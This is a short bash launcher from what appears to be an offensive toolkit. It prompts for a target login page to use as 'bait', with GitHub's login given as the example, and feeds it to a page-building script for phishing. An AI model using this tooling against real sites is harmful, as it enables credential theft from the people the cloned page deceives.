#!/bin/bash
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
LBBLUE='\e[104m'

cd tools/Artemis
echo -e "${ORNG}"
figlet -f mini "Artemis"
echo -e "${NC}"
echo -e "${W}Please enter the target domain's page to use for bait"
echo -e "${RED}eg. 'https://github.com/login'"
read DOM
sleep 1
./builder.py "${DOM}"

cd ../..
./tigershark
